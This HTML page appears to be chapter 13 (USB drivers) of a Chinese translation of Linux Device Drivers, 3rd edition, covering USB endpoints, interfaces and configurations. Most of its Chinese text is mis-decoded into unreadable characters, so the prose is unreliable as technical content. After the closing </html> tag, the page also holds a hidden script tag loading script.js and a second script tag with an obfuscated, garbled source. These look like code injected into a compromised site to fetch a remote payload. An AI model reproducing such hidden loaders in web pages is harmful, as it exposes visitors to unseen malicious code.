<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>&#160;13&#160;&#160;USB -Linux豸棨İ棩</title>
<meta name="description" content="" />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,,Ƶ" />
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="index.html" title="Linux 豸 Edition 3">
<link rel="prev" href="ch12s08.html" title="12.8.&#160;ٲο">
<link rel="next" href="ch13s02.html" title="13.2.&#160;USB  sysfs">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">&#160;13&#160;&#160;USB </th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch12s08.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch13s02.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="chapter" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title">
<a name="USBDrivers.chap"></a>&#160;13&#160;&#160;USB </h2></div></div></div>
<div class="toc">
<p><b>Ŀ¼</b></p>
<dl>
<dt><span class="sect1"><a href="ch13.html#USBDeviceBasics.sect1">13.1. USB 豸֪ʶ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch13.html#Endpoints.sect2">13.1.1. ˵</a></span></dt>
<dt><span class="sect2"><a href="ch13.html#Interfaces.sect2">13.1.2. ӿ</a></span></dt>
<dt><span class="sect2"><a href="ch13.html#Congurations.sect2">13.1.3. </a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch13s02.html">13.2. USB  sysfs</a></span></dt>
<dt><span class="sect1"><a href="ch13s03.html">13.3. USB  Urbs</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch13s03.html#structurb.sect2">13.3.1. ṹ struct urb</a></span></dt>
<dt><span class="sect2"><a href="ch13s03.html#CreatingandDestroyingUrbs.sect2">13.3.2.  urb</a></span></dt>
<dt><span class="sect2"><a href="ch13s03.html#SubmittingUrbs.sect2">13.3.3. ύ urb</a></span></dt>
<dt><span class="sect2"><a href="ch13s03.html#CompletingUrbsTheCompletionCallbackHandler.sect2">13.3.4.  urb: ɻص</a></span></dt>
<dt><span class="sect2"><a href="ch13s03.html#CancelingUrbs.sect2">13.3.5. ȡ urb</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch13s04.html">13.4. дһ USB </a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch13s04.html#WhatDevicesDoestheDriverSupport.sect2">13.4.1. ֧ʲô豸</a></span></dt>
<dt><span class="sect2"><a href="ch13s04.html#RegisteringaUSBDriver.sect2">13.4.2. עһ USB </a></span></dt>
<dt><span class="sect2"><a href="ch13s04.html#SubmittingandControllingaUrb.sect2">13.4.3. ύͿһ urb</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch13s05.html">13.5.  urb  USB </a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch13s05.html#usb_bulk_msg.sect2">13.5.1. usb_bulk_msg ӿ</a></span></dt>
<dt><span class="sect2"><a href="ch13s05.html#usb_control_msg.sect2">13.5.2. usb_control_msg ӿ</a></span></dt>
<dt><span class="sect2"><a href="ch13s05.html#OtherUSBDataFunctions.sect2">13.5.3. ʹ USB ݺ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch13s06.html">13.6. ٲο</a></span></dt>
</dl>
</div>
<p>ͨô(USB)һ֮. ٺͲͬ-, , ͼ--һ豸ӵ.<sup>[<a name="id473861" href="#ftn.id473861">45</a>]</sup> USB ѾɳЩӲּ֧ÿֿӵ PC 豸. USB 淶°汾˸, ϵ 480 MBps.</p>
<p>˽ṹ, һ USB ϵͳûͬһһֲ; һ, мԵ. Щ 4- (, Դ,  2 ź)һ豸һ, ͬ˫̫. USB ѯÿ USB 豸Ƿݷ. ˹ϵ, һ USB 豸ûȱѯʱӲ. һǳ׼弴õϵͳ, 豸Զ.</p>
<p>ڼǷǳ򵥵, Ϊһʵ, ѯ. е, һЩȤ, һ豸ܹһ̶ݴʹ, Ϊ˿ɿ֧ƵƵ I/O. һҪֻΪ豸֮һͨѶͨ, ݵûĺͽṹҪ.</p>
<p>ʵ, һЩṹ, 󲿷־ΪӦһԤȶ: , һ̲, һЩƵͷ.</p>
<p>USB Э淶һױ׼, κض͵豸ѭ. һ豸ѭ׼, ôǸ豸һͲ. ЩͬͳΪ, Ұͬ洢豸, , , Ϸ, 豸, è. ʺЩ豸ҪһĹӦ-ضЩر豸. Ƶ豸 USB-- 豸һõ, ûжõı׼, ҪһÿԲ̵ͬĲͬ豸.</p>
<p>Щ, ͬеϵȲ, ʹ USB Ϊһ, ͳɱĻ(ȥ)豸, عػ, , ݶ͵.</p>
<p>Linux ں֧ 2  USB : λϵͳλ豸. ϵͳ USB Ʋе USB 豸, Ĺ۵㿴(һͨ USB һ). 豸е USB , Ƶ豸Ϊһ USB 豸ϵͳ. " USB 豸"ǷǳԻ, USB Ѿ" USB "һӵ USB 豸(ס Linux ҲЩСǶʽ豸). һ̨ϵ USB ϵͳι. USB ʱ˱ķΧ.</p>
<p>ͬͼ<a href="ch13.html#ldd3-13-1.fig" title="ͼ&#160;13.1.&#160;USB ">USB </a>ʾ, USB λڲͬںϵͳ(, , ַ, ȵ)Ӳ֮. USB ṩһӿڸ USB ȡͿ USB Ӳ, صĳϵͳеĲͬ USB Ӳ.</p>
<div class="figure">
<a name="ldd3-13-1.fig"></a><p class="title"><b>ͼ&#160;13.1.&#160;USB </b></p>
<div><img src="images/snagitldd3/ldd3-13-1.png" alt="USB "></div>
</div>
<div class="figure">
<a name="ldd3-13-2.fig"></a><p class="title"><b>ͼ&#160;13.2.&#160;USB 豸</b></p>
<div><img src="images/snagitldd3/ldd3-13-2.png" alt="USB 豸"></div>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="USBDeviceBasics.sect1"></a>13.1.&#160;USB 豸֪ʶ</h2></div></div></div>
<p>һ USB 豸һǳӵ, ͬڹٷ USB ĵ(ɴ http://www.usb.org еõ). ˵, Linux ṩһϵͳΪ USB , 󲿷ָӵĹ. һ USB ֮Ľ. ͼ<a href="ch13.html#ldd3-13-2.fig" title="ͼ&#160;13.2.&#160;USB 豸">USB 豸</a>ʾ USB 豸ΰ, ӿ, Ͷ˵, Լ USB ΰ󶨵 USB ӿ,  USB 豸.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="Endpoints.sect2"></a>13.1.1.&#160;˵</h3></div></div></div>
<p>USB ͨѶʽͨĳЩΪ ˵ . һ USB ˵ֻһ, ߴ豸(Ϊ˵)ߴ豸(Ϊ˵). ˵ɿһĹܵ.</p>
<p>һ USB ˵ 4 ֲͬ͵һ, α:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>CONTROL </span></span></dt>
<dd><p>ƶ˵㱻 USB 豸Ĳִͬȡ. ͨ豸, ȡ豸Ϣ, 豸, ߻ȡ豸״̬. Щ˵ڳߴϳС. ÿ USB 豸һƶ˵Ϊ"˵ 0",  USB ڲʱ豸. Щ USB Э鱣֤㹻Ĵʹ豸.</p></dd>
<dt><span class="term"><span>INTERRUPT </span></span></dt>
<dd><p>ж϶˵㴫С, Թ̶ÿ USB 豸ʱ. Щ˵ USB ̺˵ҪĴͷ. ǻݵ USB 豸豸, ͨʹ. Щ USB Э鱣֤㹻Ĵʹ豸.</p></dd>
<dt><span class="term"><span>BULK </span></span></dt>
<dd><p>˵㴫ʹ. Щ˵㳣ж϶˵(һοɳиַ). ձ, ҪͲκݶʧ. ЩͲ USB Э鱣֤һֱʹضʱ䷶Χ. û㹻Ŀռ BULK , Ϊδ͵ߴ豸. Щ˵ձڴӡ, 洢, 豸.</p></dd>
<dt><span class="term"><span>ISOCHRONOUS </span></span></dt>
<dd><p>ͬ˵Ҳʹ, ݳ֤. Щ˵ڿԴݶʧ豸, Ҹڱֳ. ʵʱռ, ƵƵ豸, һֱʹЩ˵.</p></dd>
</dl></div>
<p>ƺͿ˵첽ݴ, ۺʱʹ. жϺͬ˵Ե. ζЩ˵㱻ڹ̶ʱ, ʹǵĴ USB .</p>
<p>USB ˵ںʹýṹ struct usb_host_endpoint . ṹʵĶ˵Ϣһṹ, Ϊ struct usb_endpoint_descriptor. ߰е USB-ض , 豸ض׼ȷʽ. ĵṹĳԱ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>bEndpointAddress </span></span></dt>
<dd><p>ض˵ USB ַ.  8-λ ֵǶ˵ķ. λ USB_DIR_OUT  USB_DIR_IN Աȶ, ˵ǵ豸ǵ.</p></dd>
<dt><span class="term"><span>bmAttributes </span></span></dt>
<dd><p>Ƕ˵. λ USB_ENDPOINT_XFERTYPE_MASK Ӧֵȶ, ˵Ƿ USB_ENDPOINT_XFER_ISOC, USB_ENDPOINT_XFER_BULK,  USB_ENDPOINT_XFER_INT. Щ궨ͬ, , ж϶˵, Ӧ.</p></dd>
<dt><span class="term"><span>wMaxPacketSize </span></span></dt>
<dd><p>ֽڼƵ˵һδС. עܷʹıֵݵ˵, ݻᱻΪ wMaxPakcetSize Ŀ, ͵豸ʱ. ڸ豸, Աֶ֧˵һߴģʽ, ͨʹüλֵĸλ. ɵϸڼ USB 淶.</p></dd>
<dt><span class="term"><span>bInterval </span></span></dt>
<dd><p>˵ж͵, ֵΪ˵õļ, ˵ж֮ʱ. ֵԺʾ.</p></dd>
</dl></div>
<p>ṹĳԱûһ"ͳ" Linux ں˵. ΪЩԱֱӶӦ USB 淶е. USB ں˳ԱΪʹù涨ӸҪ, ԱĶ淶ʱٻ, ʹЩӶ Linux ԱϤ. </p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="Interfaces.sect2"></a>13.1.2.&#160;ӿ</h3></div></div></div>
<p>USB ˵㱻ڽӿ. USB ӿֻһ USB ߼, һ, һ, һƵ. һЩ USB 豸жӿ, һ USB  2 ӿ: һ USB ̸ťһ USB Ƶ. Ϊһ USB ӿڱʾĹ, ÿ USB һӿ; , , Linux Ҫ 2 ͬһӲ豸.</p>
<p>USB ӿڿԤ, ǶԽӿڲĲͬѡ. ӿڵĳʼ״̬ǵһ, 0 . ԤÿԲͬʽƵĶ˵, ͬ USB 豸. ÿͬ˵豸ʹԤ豸ͬһӿ.</p>
<p>USB ӿںʹ struct usb_interface ṹ. ṹ USB ˴ݸ USB Ĳ USB Ƶ. ṹеҪԱ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>struct usb_host_interface *altsetting </span></span></dt>
<dd><p>һԤõĽӿڽṹ, ɱѡӿ. ÿ struct usb_host_interface һ׶˵, ͬ struct usb_host_endpoint ṹ. עЩӿڽṹûر˳.</p></dd>
<dt><span class="term"><span>unsigned num_altsetting</span></span></dt>
<dd><p> altsetting ָָԤõĿ.</p></dd>
<dt><span class="term"><span>struct usb_host_interface *cur_altsetting </span></span></dt>
<dd><p>ָ altsetting һָ, ʾӿڵǰļ.</p></dd>
<dt><span class="term"><span>int minor </span></span></dt>
<dd><p>󶨵ӿڵ USB ʹ USB ,  USB İŸӿڵĴα. ֻһγɹص usb_register_dev (Ժ)֮Ч.</p></dd>
</dl></div>
<p> struct usb_interface ṹԱ,  USB Ҫ֪.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="Congurations.sect2"></a>13.1.3.&#160;</h3></div></div></div>
<p>USB ӿԼõ. һ USB 豸жòҿ֮תԱı豸״̬. , һЩ̼صǵ豸ʵ. һֻһʱϱʹ. Linux  USB 豸̫, , ˵, Ǻ.</p>
<p>linux  USB ʹýṹ struct usb_host_config  USB 豸ʹýṹ struct usb_device. USB 豸ͨҪдЩṹκֵ, ûϸ. Ķ߿ںԴļ include/linux/usb.h ҵǵ.</p>
<p>һ USB 豸ͨòתݴӸ struct usb_interface ṹ struct usb_device ṹ, USB Ҫܶĺ. Ϊ, ṩк interface_to_usbdev. Ժ, ϣеĵǰҪһ struct usb_device  USB , תΪһ struct usb_interface , ҲҪת.</p>
<p>ܽ, USB 豸Ƿǳӵ, ಻ͬ߼Ԫ. ЩԪ֮Ĺϵɼ򵥵:</p>
<div class="itemizedlist"><ul type="disc">
<li><p>豸ͨһ.</p></li>
<li><p>óһӿ</p></li>
<li><p>ӿڳһ.</p></li>
<li><p>ӿ˵.</p></li>
</ul></div>
</div>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id473861" href="#id473861">45</a>] </sup>µĶǻںеĸ Linux ں USB ĵ, Щں USB ߱д GPL .</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch12s08.html">һҳ</a>&#160;</td>
<td width="20%" align="center">&#160;</td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch13s02.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">12.8.&#160;ٲο&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;13.2.&#160;USB  sysfs</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>